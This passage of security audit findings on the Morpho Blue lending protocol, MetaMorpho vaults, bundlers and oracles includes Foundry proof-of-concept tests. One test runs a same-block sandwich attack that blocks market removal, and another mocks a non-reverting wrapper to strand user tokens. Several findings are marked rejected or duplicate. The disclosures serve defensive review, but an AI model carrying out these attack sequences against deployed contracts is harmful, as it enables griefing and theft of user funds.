4. The `reallocate` function reverts because of the strict equality check, leading to a denial of service.

- Impact

This vulnerability can lead to permanent DoS scenario rendering the function`reallocate` unusable, 

- Recommendations

- Implement a tolerance margin for `totalWithdrawn` and `totalSupplied` comparison.





### [M] Inaccurate Collateral Pricing Due to Deprecated Chainlink Oracle Feeds 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
It's a bit difficult to track deprecated Chainlink oracles since Chainlink removes the announcement once 
they're deprecated.
I was able to track one Oracle that was deprecated during the first audit, from the original issue this seems 
to be this one.
It seems that what happens is that Chainlink sets the aggregator address to the zero address, which makes the 
call to ```latestRoundData()``` to revert without any data (I guess this is due to the way Solidity handles calls 
to a non-contract address).

Oracle Behavior:

Suppose a Chainlink feed is deprecated, and its address is set to zero.
The ```getPrice``` function from the ChainlinkOracle contract will then return 1 for this feed.
Morpho Liquidation Function:

The liquidate function in Morpho relies on ```IOracle(marketParams.oracle).price()``` to get the price of the collateral.
This price is crucial for calculating whether a position is healthy (i.e., not undercollateralized) 
and eligible for liquidation.


Example 1: Undercollateralized Position Not Detected

Situation: A borrower has a position that is actually undercollateralized due to market movements.
Oracle Behavior: The Chainlink feed is deprecated, and the oracle returns 1 as the price.
Impact: The liquidate function checks if the position is healthy using a skewed price (1). 
The actual market price is not considered, potentially missing an undercollateralized position.
Result: The position which should be liquidated remains active, posing a risk to lenders 
as the actual collateral might not be sufficient to cover the debt.

Example 2: Overcollateralized Position Incorrectly Liquidated

Situation: 

A borrower’s position is well-collateralized and not eligible for liquidation.

Oracle Behavior: 

Due to a deprecated feed, the oracle reports a price of 1, which is not reflective 
of the actual market value.
Impact: If the reported price is significantly lower than the market price, the system may erroneously 
consider the position as undercollateralized.
Result: An otherwise healthy position might get liquidated, causing unjust loss to the borrower.



**Recommendation**:
Fallback Price Mechanism:

Instead of defaulting to 1, implement a more sophisticated fallback mechanism.
This could involve using an average of past prices, consulting multiple oracles, or triggering a governance decision.
Circuit Breaker:

Implement a circuit breaker that pauses liquidations or other critical functions when an oracle feed is found to be unreliable or deprecated.
This adds a layer of security, preventing erroneous liquidations based on incorrect price data.



### [M] Chainlink oracle will return the wrong price if the aggregator hits minPrice	_(duplicate of [Chainlink feed will return the wrong price for asset if underlying aggregator hits minAnswer])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
Chainlink aggregators have a built-in circuit breaker if the price of an asset goes outside of a predetermined price band.

The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle 
will continue to return the ```minPrice``` instead of the actual price of the asset and vice versa.

In the ```getPrice``` function, there isnt't currently a check to see if the price is the ```minPrice```, or if the 
price is the ```maxPrice```.

```
 function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

There isn't a mechanism within this specific function to handle or recognize when a price might be 
'frozen' due to Chainlink's circuit breakers. This could lead to situations where the price reported by 
the oracle does not reflect the current market value of the asset, which in turn could impact functions 
that rely on this price data, such as liquidations or value calculations in the DeFi protocol.

An attacker could exploit this vulnerability by:

Acquiring the asset at its actual lower market price during a crash.
Depositing this asset into a lending/borrowing platform that uses Chainlink's price feeds.
Borrowing against the asset based on the inflated oracle price, which doesn't reflect the asset's true market value.
This could allow the attacker to borrow more value than the collateral is worth, leading to a loss for the lending platform and its users.


**Recommendation**:


You can either set minPrice &/or maxPrice values for each feed. These values could be constants or 
configurable by governance for example, or use of a fallback mechanism utilizing multiple oracles.



### [M] Morpho's Current Implementation is Not EIP1271 Compliant	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

ERC-1271 introduces a standardized method for smart contracts to validate signatures, 
addressing the unique challenge that contracts, unlike Externally Owned Accounts (EOAs), 
cannot sign messages in a conventional manner due to the absence of private keys. 
The ```isValidSignature``` function defined in ERC-1271 enables a contract to verify the authenticity of a 
given signature in relation to a specific message. This capability is crucial for enabling smart contracts, 
such as those governing DAOs (Decentralized Autonomous Organizations), to engage in activities that necessitate 
signature authentication.

In its current form, Morpho predominantly utilizes the EIP712 standard for signature verification. 
While EIP712 effectively handles signature validation for EOAs by providing a structured and secure 
method of hashing and signing data, it does not inherently address the signature validation needs of 
smart contracts.

This lack of compatibility with ERC-1271 becomes a significant obstacle, especially in scenarios involving 
advanced wallet implementations or DAOs attempting to execute transactions on behalf of their members.

For instance, a DAO, managed through a smart contract, might need to engage Morpho 
for lending, borrowing, or other decentralized finance strategies. However, the current implementation of 
Morpho does not support ERC-1271, which means it lacks the infrastructure to recognize or validate signatures 
originating from a DAO’s smart contract. This limitation effectively restricts DAOs and similar contract-based 
entities from autonomously interacting with Morpho, thereby hindering their ability to leverage the protocol's 
full potential without resorting to manual interventions or relying solely on actions initiated by 
individual EOA members.


**Recommendation**:

To address this gap, Morpho would need to incorporate ERC-1271 support, allowing it to validate 
signatures generated by smart contracts by using the ```isValidSignature``` method. 




### `MetaMorpho.sol` pausable tokens can break logic	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Links
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L518
https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L133

- Summary
Pausable tokens such as ZIL can break the logic of `MetaMorpho.sol` when used as collateral or Loan token for a market.

- Vulnerability Details
Such tokens (BNB, ZIL) have a Pausable mechanism implemented that allows an admin controlled address to pause token usage/transfers.

- Impact
This opens users up to several risks including inability to receive back collateral or Loan token after settling a loan. If the loan token is the issue, then borrows will be enable to setlle a loan which will expose them to an increased market risk. Another example is causing the liquidation of assets with such tokens backing as collateral to revert. Which can expose the market to a huge risk as undercollateralized position are not being iquidated. 
This can also affect other functionalities like `claim` for rewards.

- Recommendations
- Alerting users on the borrow page for a market of the potential risks of a pausable token would be great. 
- Also, disallowing such tokens to be used as collateral using a `disallowedToken` array/mapping would be a great fix as well as you can check against such benchmark during a market's creation.



### [M] Chainlink Mainnet oracles not compatible with wsthETH causing many yield strategies to be broken

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
Mainnet oracles are incompatible with wstETH causing many popular yields strategies to be broken. Chainlink and Band do not have wstETH oracles and using Uniswap LP pairs would not be advantageous given their low liquidity.

Thus considering that Morpho have a method to facilitate the use of wstETH as collateral.

```
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;

        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

        return uint256(answer);
    }
```

As it stands, ChainlinkOracles used by Morpho only supports single asset price data.

https://github.com/morpho-org/morpho-blue-oracles

This makes it completely incompatible with wstETH because chainlink doesn't have a wstETH oracle on mainnet. Additionally Band protocol doesn't offer a wstETH oracle either. 

See below for list of other chainlink feeds n wstETH

https://data.chain.link/optimism/mainnet/crypto-usd/wsteth-usd


**Recommendation**:
I wouldn't recommend using Uniswap orcales due to low liquidity and considering that wstETH is a component of many highly attractive pools, consider creating a special bypass specifically for wstETH utilizing the stETH oracle and it's current exchange rate.






### Rebasing tokens go to the MetaMorpho contract owner, or remain locked in the contract	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Links :
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559
https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572

- Description
Rebasing tokens are tokens that have each holder's balanceof() increase over time. Aave aTokens are an example of such tokens.

- Impact
If rebasing tokens are used for a market, rewards accrue to the contract cannot be withdrawn by either the depositors or the owner, and remain locked forever.

The supply amounts available are determined using internal accounting. The users can supply the `Morpho` contract by calling the `deposit` function in `MetaMorpho`. So effectively the tokens will be locked in `Morpho` and cannot be recovered.


An increase in the contract's balance in the rebase token will not be met by an increase in the internal accounting.

- Recommended Mitigation Steps
- Track total amounts currently deposited and allow lenders and collateral depositors to withdraw excess on a pro-rata basis
- Disallow rebasing tokens



### Bundler doesn't return exces funds in its balance in the end and the reaminging funds in the Bundler will be lost	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [BaseBundler.sol#L51-L51](morpho-blue-bundlers/src/BaseBundler.sol#L51-L51)

it's better for bundles to return excess funds that remains in bundle address after they do the actions. 
it's true that users can transfer ERC20 and ETh from the bundle but it's not enforced.
also because most of actions amount is not known during transaction signing so it's probable for some tokens to remain in bundle balance.

code should either transfer ERC20(those who bundle interacted with them) and ETH balance of the bundle in the end of the multicall or users should be warned about this that remaining funds will be lost.



### ERC20WrapperBundler calls are missing return value checks

**Severity:** Medium risk

**Context:** [ERC20WrapperBundler.sol#L38-L38](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L38-L38), [ERC20WrapperBundler.sol#L54-L54](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L54-L54)

- Description:

The Morpho Blue bundler offers users the capability to bundle calls, including interactions with contracts that implement the `ERC20Wrapper` interface. This functionality is facilitated through the `erc20WrapperDepositFor()` and `erc20WrapperWithdrawTo()` functions.

The current implementation presents a vulnerability as it neglects to check the boolean return value of the underlying `ERC20Wrapper` functions. While the OpenZeppelin implementation returns true for successful calls and reverts on errors, alternative implementations may simply return false in case of an unsuccessful call, allowing the call to proceed without reverting.

Given that the documentation specifies the assumption that the wrapper implements the `ERC20Wrapper` interface without explicitly detailing the OpenZeppelin functionality, variations in implementation are valid. Consequently, this issue may result in a scenario where a user sends tokens for wrapping to the contract, but the wrapper fails to transfer them out of the bundler (e.g., due to a blocklist) and returns false. Since the return value is not checked, the execution continues, leaving the user's tokens within the bundler and vulnerable to theft.

- Impact

This issue can lead to a potential loss of user funds as a user will expect the bundler to revert in the case of any of the transferring functions failing, but instead the bundler will finish the execution. leaving tokens in the bundler. These tokens could then be stolen by anyone.

- POC

To simulate this issue I have implemented a simple ERC20Wrapper that returns false on an incorrect deposit instead of reverting.

```solidity
import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ERC20WrapperNotReverting {
    IERC20 private immutable _underlying;
    mapping(address => uint256) public balances;

    constructor(IERC20 underlyingToken) {
        _underlying = underlyingToken;
    }

    function underlying() public view returns (IERC20) {
        return _underlying;
    }

    /**
     * @dev Allow a user to deposit underlying tokens and mint the corresponding number of wrapped tokens.
     */
    function depositFor(address account, uint256 amount) public virtual returns (bool) {
        if(msg.sender != address(0x123456))
        {
            //simulating only dedicated users being allowed to call the function
            return false;
        }

        _underlying.transferFrom(msg.sender, address(this), amount);
        balances[account] += amount;
        return true;
    }
}
```

In the following POC one can see the issue happen:

<details>

```solidity
function testErc20WrapperDepositForNoRevert() public {
    //Deploy the non reverting mock
    ERC20WrapperNotReverting wrapper2 = new ERC20WrapperNotReverting(loanToken);

    bundle.push(_erc20WrapperDepositFor(address(wrapper2), 100));

    loanToken.setBalance(address(bundler), 100);

    vm.prank(RECEIVER);
    bundler.multicall(bundle);

    //Tokens are still left in the contract but it didn't revert
    assertEq(loanToken.balanceOf(address(bundler)), 100, "loan.balanceOf(bundler)");
    assertEq(loanWrapper.balanceOf(RECEIVER), 0, "loanWrapper.balanceOf(RECEIVER)");
}
```

</details>

The testcase can be run by:
1. Adding the `ERC20WrapperNotReverting` contract to the `morpho-blue-bundlers/src/mocks` folder
2. Importing it using `import {ERC20WrapperNotReverting} from "../../src/mocks/ERC20WrapperNotReverting.sol";`
3. Adding the testcase to `morpho-blue-bundlers/test/forge/ERC20WrapperBundlerBundlerLocalTest`
4. Run it using `forge test -vvvv --match-test "testErc20WrapperDepositForNoRevert"`

- Recommendation:

Mitigate this issue by incorporating return value checks for the calls to the functions `ERC20Wrapper(wrapper).depositFor()` and `ERC20Wrapper(wrapper).withdrawTo()`. The recommended adjustments are as follows:

Deposit:
```solidity
bool success = ERC20Wrapper(wrapper).depositFor(initiator(), amount);
require(success, "Deposit was unsuccessfull");
```

Withdraw:
```solidity
bool success = ERC20Wrapper(wrapper).withdrawTo(account, amount);
require(success, "Withdraw was unsuccessfull");
```




### risk of using vaults that supports loss in oracle that can cause 0 price for oracle	_(duplicate of [code should check that VAULT.getAssets(VAULT_CONVERSION_SAMPLE) is bigger than 10^6 to avoid wrong prices by rounding errors])_

**Severity:** Medium risk

**Context:** [ChainlinkOracle.sol#L118-L118](morpho-blue-oracles/src/ChainlinkOracle.sol#L118-L118)

regarding `VAULT_CONVERSION_SAMPLE`, the code comment's say that: "Should be chosen such that converting `VAULT_CONVERSION_SAMPLE` to assets has enough precision."

the issue here is that some some vaults have slash mechanism and vault can face loss in the future. the loss makes `share / asset` ratio to become bigger, so even if in the beginning market creators set valid number for `VAULT_CONVERSION_SAMPLE` that `VAULT.getAssets(VAULT_CONVERSION_SAMPLE)` results in correct precision, but after a while if a big loss happens for vault, then the value of the `VAULT.getAssets(VAULT_CONVERSION_SAMPLE)` can become zero or have very large rounding error which will cause oracle to return 0 price or very wrong price.


this risk is not mentioned in the docs. I believe users should be alarmed about this risk and they shouldn't use Vault's that decrease assets when loss happens.



### Fee change by the owner is not timelocked	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L233-L233](metamorpho/src/MetaMorpho.sol#L233-L233)

- Bug Description
The documentation for the `MetaMorpho` contract indicates that the owner can adjust the fee while adhering to a timelock. The Readme explicitly states that the owner role can `[Timelocked with no possible veto] Set the performance fee (capped to 50%)`. However, the actual implementation diverges from this description. In practice, the fee is set directly without any regard for the specified timelock.

```solidity
/// @notice Sets the `fee` to `newFee`.
function setFee(uint256 newFee) external onlyOwner {
	//Require Statements excluded for bettere readability
	
	// Accrue interest using the previous fee set before changing it.
	_updateLastTotalAssets(_accrueFee());
	
	// Safe "unchecked" cast because newFee <= MAX_FEE.
	fee = uint96(newFee);
	
	emit EventsLib.SetFee(_msgSender(), fee);
}
```

- Impact
The current misimplementation misleads users into believing they have a timelock period to withdraw their funds before a fee change. A user could, for instance, configure a bot to wait for the `setFee` event, assuming they can withdraw at the end of the timelock period without incurring the fee. However, in reality, the fee is applied for the entire duration between the emission of the event and the user's withdrawal. Such miscommunication about timelocks on governance functions may additionally erode user trust in the protocol.

- Proof of Concept
he incorrect functionality is evident in the existing testcase `testSetFee()` in the `FeeTest.sol` file.
```solidity
function testSetFee(uint256 fee) public {
	fee = bound(fee, 0, ConstantsLib.MAX_FEE);
	vm.assume(fee != vault.fee());
	
	vm.expectEmit(address(vault));
	emit EventsLib.SetFee(OWNER, fee);
	vm.prank(OWNER);
	vault.setFee(fee);
	
	assertEq(vault.fee(), fee, "fee");
}
```

- Recommended Mitigation Steps
To address this issue, consider implementing a pending system similar to the one used for the timelock and guardian. This involves creating `submitFee()` and `acceptFee()` functions

```solidity
function submitFee(uint96 newFee) external onlyOwner {
	if (newFee == fee) revert ErrorsLib.AlreadySet();
	if (newFee == pendingFee) revert ErrorsLib.AlreadyPending();
	if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
	if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();
	
	pendingFee.update(newFee, timelock);
	
	emit EventsLib.SubmitFee(newFee);
}

function acceptFee() external afterTimelock(pendingFee.validAt) onlyOwner {
	fee = pendingFee.value;

	emit EventsLib.SetFee(_msgSender(), fee);
}

```

Extend the `PendingLib` by adding an updating function for `uint96`.

```solidity
function update(PendingFee storage pending, uint96 newValue, uint256 timelock) internal {
	pending.value = newValue;
	// Safe "unchecked" cast because timelock <= MAX_TIMELOCK.
	pending.validAt = uint64(block.timestamp + timelock);
}
```





### Incorrect constant in IRM constants	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [ExpLib.sol#L19-L19](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L19-L19)

- Bug Description

The Morpho Blue Interest Rate Model (IRM) incorporates the `ExpLib` for interest rate calculations, with one of the constants being `WEXP_UPPER_BOUND`. This constant is defined as `ln(type(int256).max / 1e36) (scaled by WAD, floored)`.

However, upon further examination, it is evident that the value used as the constant is inaccurate, as illustrated in this [calculation](https://www.wolframalpha.com/input?i2d=true&i=ln%5C%2840%29Divide%5B57896044618658097711785492504343953926634992332820282019728792003956564819967+%2C1e36%5D%5C%2841%29+) on Wolfram Alpha. The calculated actual value deviates after the 16th decimal, as shown below:

```
SET_VAL    = 93.859467695000404319
ACTUAL_VAL = 93.859467695000409276
```
- Impact

This discrepancy will result in inaccurate calculations within the Interest Rate Model (IRM), leading to an incorrect interest rate being utilized in Morpho Blue.
- Recommended Mitigation Steps

To rectify this issue, it is advised to adjust the constant to reflect the accurate value:

```solidity
int256 internal constant WEXP_UPPER_BOUND = 93.859467695000409276 ether;
```



### Removal of zero supply market can be DOSd through a sandwich attack	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L346-L346](metamorpho/src/MetaMorpho.sol#L346-L346)

- Bug Description

The `MetaMorpho` contract facilitates the management of positions in various morpho blue markets, allowing for the addition and removal of markets from the managed list. Removing a market with a cap set to zero and no supplied assets is achieved through the `updateWithdrawQueue()` function. However, the implementation can be susceptible to front-running attacks.

The vulnerability lies in the `supply()` function of a morpho blue market, which permits anyone to supply on behalf of anyone else without requiring authorization. Consequently, a problem arises in the `updateWithdrawQueue()` function, which includes the following check:

```solidity
if (MORPHO.supplyShares(id, address(this)) != 0) {
	if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);
	
	if (block.timestamp < config[id].removableAt) {
		revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
	}
}
```

If an attacker successfully supplies funds on behalf of MetaMorpho by front-running the transaction, the function will proceed into the `if` statement and revert, given that no market removal request has been submitted. This issue has been recognized and addressed in the comments above the function with the following mitigation strategy:

```solidity
/// @notice Removing a market requires the vault to have 0 supply on it; but anyone can supply on behalf of the
/// vault so the call to `sortWithdrawQueue` can be griefed by a frontrun. To circumvent this, the allocator can
/// simply bundle a reallocation that withdraws max from this market with a call to `sortWithdrawQueue`.
```

However, the implementation of this described mitigation introduces a vulnerability to a more sophisticated sandwich attack. This attack involves the attacker strategically waiting for a transaction initiated by the allocator and then orchestrating a sequence that sandwiches it between a front-run and back-run. The attack unfolds in three phases:

**Frontrun (Attacker controlled):**
1. The attacker supplies one token on behalf of MetaMorpho.
2. The attacker, in their own name, provides sufficient collateral to borrow the entire supply of the market (collateral can be loaned for free as the attacker will repay it in the same block)
3. The attacker borrows the entire supply within the market.

**Actual transaction (Allocator controlled)**
1. The allocator attempts to reallocate all funds out of the market, resulting in a revert due to insufficient liquidity.
2. Depending on how the calls are bundled, the transaction may potentially proceed at this stage, disregarding the revert from the reallocation.
3. The allocator attempts to remove the market, but the operation fails because there is still remaining supply within the market.

**Backrun (Attacker controlled)**
1. The attacker promptly repays the borrowed funds within the same block, incurring no interest.
2. The attacker can now proceed to withdraw all their collateral and return the borrowed collateral.

- Impact
This issue allows an attacker to block all market removals that are done without submitting a removal request. This leads to a DOS of an important market functionality.

- Proof of Concept

The provided Proof of Concept (POC) illustrates the described attack
<details>

```solidity
function testUpdateWithdrawQueueSandwichAttack() public {
    //--------------- SETUP ---------------------------//
    address attacker = vm.addr(0xdeadbeef);
    MarketAllocation[] memory allocations = new MarketAllocation[](4);

    //Set the market to 0 (allMarkets[1] is at index 2 because idleParams is at index 0)
    _setCap(allMarkets[1], 0);

    //Issue the attacker 1000 collateral token and 1 loan token
    ERC20Mock(allMarkets[1].loanToken).mint(attacker, 1);
    ERC20Mock(allMarkets[1].collateralToken).mint(attacker, 1000);

    vm.startPrank(attacker);
    ERC20Mock(allMarkets[1].loanToken).approve(address(morpho), type(uint256).max);
    ERC20Mock(allMarkets[1].collateralToken).approve(address(morpho), type(uint256).max);

    //Indizes for new withdraw queue
    uint256[] memory indexes = new uint256[](3);
    indexes[0] = 0;
    indexes[1] = 1;
    indexes[2] = 3;

    //Allocations for the reallocate
    allocations[0] = MarketAllocation(idleParams, 0);
    allocations[1] = MarketAllocation(allMarkets[0], 0);
    allocations[2] = MarketAllocation(allMarkets[1], 0);
    allocations[3] = MarketAllocation(allMarkets[2], 1);

    //----------------- POC ---------------------------//
    //Attacker frontruns the transaction
    vm.startPrank(attacker);

    //First the attacker supplies 1 token on behalf of metamorpho
    morpho.supply(allMarkets[1], 1, 0, address(vault), "");

    //Now the attacker supplies some collateral into the market (must be enough to withdraw the full outstanding supply)
    morpho.supplyCollateral(allMarkets[1], 1000, attacker, "");

    //Finally the attacker withdraws the full outstanding supply
    morpho.borrow(allMarkets[1], 1, 0, attacker, attacker);
    vm.stopPrank(); 

    //Now the allocators transaction passes which is constructed according to the documentation
    //NOTE: It is broken into 2 to simplify here, but would be bundled into one transaction in reality
    vm.startPrank(ALLOCATOR);

    //First the allocator does a reallocation that withdraws max from this market
    //This will revert because the market supply can't be reallocated as it is borrowed by the attacker
    vm.expectRevert("insufficient liquidity");
    vault.reallocate(allocations);

    //It would usually never come to this call as the bundled call has already reverted before. If the revert is ignored this call will then also revert.
    vm.expectRevert(abi.encodeWithSelector(ErrorsLib.InvalidMarketRemovalNonZeroSupply.selector, allMarkets[1].id()));
    vault.updateWithdrawQueue(indexes);

    vm.stopPrank();

    //Attacker repays the loan in the same block (not having to pay any interest)
    vm.prank(attacker);
    morpho.repay(allMarkets[1], 1, 0, attacker, "");
}
```

</details>

The POC can be run by adding it to the `metamorpho/test/forge/MarketTest.sol` file and running it using `forge test -vvvv --match-test "testUpdateWithdrawQueueSandwichAttack"`.

- Recommended Mitigation Steps

Addressing this issue involves considering various mitigation approaches, each with its own implications:

**Document (No improvement to user)**

The simplest approach is documentation without altering the code, similar to other addressed issues. In this scenario, the documentation would explicitly acknowledge the potential vulnerability, advising users to wait for a market removal submission to succeed before attempting removal.

**Implement minimum cap(Improvement to user, but still exploitable)**

To enhance user security, the system could introduce a `minimumSupply` parameter for each market. If the current supply falls below this threshold, the market could still be removed. Setting the `minimumSupply` adequately high could discourage attackers, as they would lose the funds supplied on behalf of the vault. However, introducing this mitigation brings a new challenge: an allocator could remove a market not currently under a DOS attack but having less than `minimumSupply` funds, leaving the funds stuck in the market.

**Adapt Morpho Blue Supply (Fixes issue)**

The most comprehensive yet complex solution involves modifying Morpho Blue's supply functionality. Specifically, the adaptation would restrict the ability for anyone to supply on behalf of another without proper authorization. This mirrors the authorization mechanism implemented for withdrawal functions. While effective in eliminating the vulnerability, it comes at the cost of reducing the flexibility and functionality of Morpho Blue. Users would need explicit authorization for supply actions, introducing a trade-off between security and system usability.



### Intended Usage of MetaMorpho with an URD is not possible	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Bug Description
The MetaMorpho's documentation, outlined in the `Readme.md` file, provides instructions on how a deployer can distribute rewards using the `Urd`. The process involves deploying a URD and setting it as the rewards recipient for the MetaMorpho vault.

```md
- Create a rewards distributor using the [UrdFactory](https://github.com/morpho-org/universal-rewards-distributor/blob/main/src/UrdFactory.sol) (can be done by anyone).
- Set the vault’s rewards recipient address to the created URD using `setSkimRecipient`.
```

However, a critical discrepancy arises when the documentation suggests that anyone can claim tokens on behalf of the vault, automatically transferring them to the vault.

```
- Claim tokens from the Morpho Blue distribution to the vault. NB: Anyone can claim tokens on behalf of the vault and automatically transfer them to the vault.  Thus, this step might be already performed by some third-party.
```

In reality, the Morpho Blue implementation does not permit arbitrary token withdrawals on behalf of the vault by just anyone. The `withdraw()` function explicitly checks for authorization, restricting withdrawals to authorized entities, as indicated by the line `require(_isSenderAuthorized(onBehalf), ErrorsLib.UNAUTHORIZED);`.

While it might be proposed to address this by granting authorization to a dedicated rewarder through the `setAuthorization()` function whenever a new market is added to MetaMorpho, the current implementation lacks this capability. There is neither an additional function for manual authorization nor an automatic authorization process during market supply. Consequently, it is presently impossible to authorize another address to withdraw funds deposited by MetaMorpho.

Moreover, implementing such functionality could introduce a potential vulnerability. If authorization were extended to an external entity, it would gain the ability to set an arbitrary `receiver` in the `withdraw()` function, potentially draining all user funds deposited in the vault. This authorization would encompass both the deposits and the yield generated from them, necessitating careful separation to avoid unintended distribution of the deposits.

- Impact

The absence of the intended functionality due to the limitations in the MetaMorpho contract deployment impacts the deployer's ability to realize the documented functionality. Although users can still directly deposit or withdraw their funds using MetaMorpho's `ERC4626` functions, the envisioned abstraction involving a URD cannot be achieved as outlined in the documentation. The expected seamless integration and interaction with the URD for rewards distribution are hindered, potentially leading to user confusion and deviation from the anticipated usage model.

- Recommended Mitigation Steps

There are two potential approaches to mitigate this issue and align the deployment with the intended functionality outlined in the documentation:

**Simple Solution (Not Recommended):** 

Define a designated withdrawer address, automatically authorized on any supplied market. This withdrawer address would handle the withdrawal of profits from MetaMorpho to MetaMorpho and subsequently initiate the distribution. However, this introduces a single point of failure, and in the event of corruption, the designated withdrawer could potentially drain all user funds. Due to this inherent risk, this implementation is not recommended.

**Complex Solution (Recommended):**

Retain all functionality within the MetaMorpho contract. Implement a mechanism for MetaMorpho to keep track of all currently deposited assets into markets, utilizing a mapping that updates with each deposit/withdrawal. Introduce a `withdrawRewards()` function within MetaMorpho, accessible to anyone, which compares the difference between the funds MetaMorpho has in a market and the amount it has deposited. This function withdraws the difference to MetaMorpho, from where it can be retrieved using the `skim` functionality.

```solidity
function withdrawRewards(MarketParams memory marketParams) external
{
	uint256 depositedFunds = fundsInMarket[marketParams.id()];
	uint256 totalFunds = MORPHO.expectedSupplyAssets(marketParams, address(this));

	uint256 rewards = UtilsLib.zeroFloorSub(totalFunds, depositedFunds);

	if(rewards > 0)
	{
		MORPHO.withdraw(marketParams, rewards, 0, address(this), address(this));
	}
}
```

With this approach, the original `ERC4626` redeem/withdrawal functionalities need to be adapted to ensure users can only withdraw their original deposit through them. This more intricate solution maintains control and reduces potential risks associated with a designated withdrawer address.



### code should check that VAULT.getAssets(VAULT_CONVERSION_SAMPLE) is bigger than 10^6 to avoid wrong prices by rounding errors	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [ChainlinkOracle.sol#L119-L119](morpho-blue-oracles/src/ChainlinkOracle.sol#L119-L119)

when oracle uses a Vault, price will have error that will depend on the value of the `VAULT.getAssets(VAULT_CONVERSION_SAMPLE)`. because in ERC4626 Vaults we always have rounding errors when converting shares to assets or reverse. code should makes sure that this rounding error is small enough.

for example in a vault that `10^6` shares equal to 1 asset (like morpho blue or metamorpho) if the value of the `VAULT_CONVERSION_SAMPLE` was ` 1.5 * 10^6` then the value of the `VAULT.getAssets(VAULT_CONVERSION_SAMPLE)` will be `1.5*10^6 / 10^6  = 1 asset` while the real value is `1.5`, and the calculation have `(1.5-1)/1 * 100 = 50%` error. 

in general if `X = VAULT.getAssets(VAULT_CONVERSION_SAMPLE) > 1` then the calculation will have up to `100/X` percentage error. so to avoid big errors code should make sure that `X` is big enough. for example bigger than `10^6`.


in constructor add checks for `VAULT.getAssets(VAULT_CONVERSION_SAMPLE) > 10^6` to make sure rounding errors are not big enough.



###  Lack of proper sanity check in multical leading to lock or misplacement of funds. 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**

``BaseBundler.multicall`` is the parent function of all functions that will be called in the deployed bundler contract, meaning evething passes through. It is also a payable function that accepts the native coin of the chain it is deployed, for this example it is ETH. 

```
  function multicall(bytes[] memory data) external payable {
        require(_initiator == UNSET_INITIATOR, ErrorsLib.ALREADY_INITIATED);
        // @audit-issue there should be a check that validates that the msg.value is always zero after transaction. 
        // to avoid leaving value in token. especially when wrapped is sent to it. 
        _initiator = msg.sender;

        _multicall(data);

        _initiator = UNSET_INITIATOR;
    }
```

Alot of functions require sending of ETH to the bundler contract, like the functions in `WNativeBundler`, that wraps native tokens and unwraps, the function `WNativeBundler.unwrap`, sends value back to the contract, which is the unwrapped eth, it now left to the calling account to decide what to do with these native eth sent back. But if the calling account does not make use of it during the transaction, then it can be swepth by any other user who crafts its transaction to do so. 

To avoid users mistakenly calling loosing funds, the bundler contract should do a sanity check after each call, like it does with the initiator, to make sure the balance of the bundler is exactly zero after each call, and it should fail if it is not. 

This will make sure all funds sent to the contract are allocated just like is seen in `metamorpho.reallocate` 

```
if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
```

**Recommendation**

Make a sanity check to make sure the contract balance is same as it was before call to bundler, which is exactly zero, as the bundler is not meant to store any values. 



### Admin fucntion can be locked for longer than intentioned	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**

Admin can change the timelock as when it wishes in `metamorpho.submitTimelock`, but there are two conditions that decides if the incoming timelock is pending or set immediately, that is if the 

```
if (newTimelock > timelock) {.....}else{......}
```

This presents a situation that if an admin other than owner sends a request that is timelocked like submitting of cap, and the owner  changes the timelock to a duration `newTimelock > timelock` , and both transactions are in memepool, but the owners transactions goes first, it means that when finally the admins function is included in a block, it locks for a longer time than intended. 

